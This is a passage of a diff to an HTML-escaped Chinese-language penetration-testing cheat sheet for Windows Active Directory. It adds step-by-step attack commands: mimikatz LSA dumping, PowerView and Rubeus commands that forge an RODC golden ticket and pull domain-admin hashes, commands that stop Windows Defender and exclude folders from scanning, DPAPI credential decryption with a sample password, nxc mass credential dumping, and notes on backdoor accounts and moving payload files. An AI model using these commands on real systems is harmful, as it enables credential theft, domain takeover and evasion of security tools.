+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\m&lt;/span&gt;imikatz.exe &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Privilege::Debug&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lsadump::lsa /patch&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二步，注入powerview，并将域管理员添加允许同步时rodc属性&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module .&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;owerView.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;清空属性
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Set-DomainObject -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CN=RODC,OU=Domain Controllers,DC=$domain,DC=local&amp;#39;&lt;/span&gt; -Clear &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msDS-NeverRevealGroup&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;添加属性
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Set-DomainObject -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CN=RODC,OU=Domain Controllers,DC=$domain,DC=local&amp;#39;&lt;/span&gt; -Set @&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msDS-RevealOnDemandGroup&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CN=Administrator,CN=Users,DC=$domain,DC=local&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第三步，构造黄金票据&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe golden /rodcNumber:$krbtgt的数字 /rc4:$krbtgt_rodc_hash /user:administrator /id:500 /domain:$domain /sid:$domain_sid /nowrap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第四步，请求域管理hash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/$domain /dc:$dc_FQDN /ticket:doIFpjCCBaKgLhYad......
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;defender相关&#34;&gt;defender相关
 &lt;/h2&gt;&lt;h3 id=&#34;添加排除目录&#34;&gt;添加排除目录
 &lt;/h3&gt;&lt;p&gt;生成一个c:/temp目录并且使defender绕过扫描它&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir c:/temp
@@ -2918,6 +2957,7 @@ targetedKerberoast.py&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell.exe -Command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;关闭defender&#34;&gt;关闭defender
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmd /c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sc stop WinDefend&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmd /c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;net stop WdNisSvc&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;后门相关&#34;&gt;后门相关
 &lt;/h2&gt;&lt;h3 id=&#34;后门机器账户创建&#34;&gt;后门机器账户创建
 &lt;/h3&gt;&lt;p&gt;首先查看当前用户有多少个计算机用户可以创建&lt;/p&gt;
@@ -3211,11 +3251,14 @@ sekurlsa::logonPasswords full
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Users\&amp;lt;user&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;sid&amp;gt;&amp;gt;dir /a
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;解masterkey举例&#34;&gt;解masterkey(举例)
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-dpapi masterkey -file cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74 -sid S-1-5-21-298176814-2846777796-698167141-1103 -password &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Th3C@ll0fCtHu1hu!&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;-解cred举例&#34;&gt;#### 解cred（举例）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;解cred举例&#34;&gt;解cred（举例）
 &lt;/h4&gt;&lt;p&gt;目标文件获取&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Users\&amp;lt;user&amp;gt;\AppData\Roaming\Microsoft\Credentials&amp;gt;dir /a
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用上一步解密出来的masterkey解密&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-dpapi credential -file A2E4656BCBABFD9279E090E8482A7141 -key 0x0ff22e711e14912c168ec3943e2478081930413b24795f45028bf15992aebc0b5b0954128398441a4c2578c90e5c2da71bc678d8d5a4e66836e9f083e20eeb27
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;nxc-3&#34;&gt;nxc
+&lt;/h4&gt;&lt;p&gt;最权威的一个，一键利用域管理抓取所有敏感信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb $ip -u administrator -p $pass --dpapi
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;linux相关-3&#34;&gt;linux相关
 &lt;/h2&gt;&lt;h3 id=&#34;部署ssh公钥后门&#34;&gt;部署ssh公钥后门
 &lt;/h3&gt;&lt;p&gt;首先在本地生成公钥私钥&lt;/p&gt;
@@ -3326,6 +3369,8 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tr -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &amp;lt; test.kirbi.b64 &amp;gt; cleaned.kirbi.b64
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;再
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tr -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt; &amp;lt; cleaned.kirbi.b64 &amp;gt; final_ticket.b64
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dos2unix ed25519
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后bse64解密&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base64 -d ticket.kirbi.b64 &amp;gt; ticket.kirbi
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换类型&lt;/p&gt;
@@ -3340,7 +3385,12 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;递归详细查找隐藏文件&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gci -recurse -force &lt;span style=&#34;color:#f92672&#34;&gt;-file&lt;/span&gt; &amp;lt;文件夹&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;传递文件传文件&#34;&gt;传递文件——传文件
-&lt;/h2&gt;&lt;h3 id=&#34;base64传文件&#34;&gt;base64传文件
+&lt;/h2&gt;&lt;h3 id=&#34;分块传输&#34;&gt;分块传输
+&lt;/h3&gt;&lt;p&gt;适应文件大小过大无法传输,以下命令是将程序分成100kb一份的程度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aplit -b &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;传递到目标机器后合并&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat shell* &amp;gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;base64传文件&#34;&gt;base64传文件
 &lt;/h3&gt;&lt;h4 id=&#34;linux&#34;&gt;linux
 &lt;/h4&gt;&lt;p&gt;先将文件base64&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base64 -w0 filename
@@ -3535,7 +3585,7 @@ linux换行&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb $ip -u $user -p $pass -k --generate-krb5-file krb5.conf
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;impacket包&#34;&gt;impacket包
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;使用的时候只需要导入票据，在原本使用基础上-k -no-pass,或者不使用 -k -no-pass，单纯使用用户名或者密码进行-k参数也能使用，impacket包会自动完成请求tgt并导入的操作
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nxc-3&#34;&gt;nxc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nxc-4&#34;&gt;nxc
 &lt;/h3&gt;&lt;p&gt;导入票据后，在原有命令加上&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-k
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;bloodhound-python-1&#34;&gt;bloodhound-python
